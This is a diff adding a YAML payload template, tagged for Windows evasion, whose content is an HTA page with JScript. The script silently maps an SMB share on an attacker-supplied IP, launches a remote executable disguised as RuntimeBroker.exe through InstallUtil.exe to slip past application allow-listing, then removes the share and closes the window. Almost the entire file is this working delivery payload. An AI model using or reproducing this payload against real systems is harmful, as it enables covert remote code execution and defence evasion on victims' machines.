@@ -1,0 +1,21 @@
+---
+metadata:
+  filename: "installutil-hta-smb.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-06-04"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  <html>
+  <head>
+  <script language="JScript">
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.Run("cmd /c net use \\\\{{ attacker_ip }}\\share", 0, true);
+  shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U \\\\{{ attacker_ip }}\\share\\RuntimeBroker.exe", 0, false);
+  WScript.Sleep(5000);
+  shell.Run("cmd /c net use \\\\{{ attacker_ip }}\\share /delete /y", 0, false);
+  window.close();
+  </script>
+  </head>
+  <body></body>
+  </html>
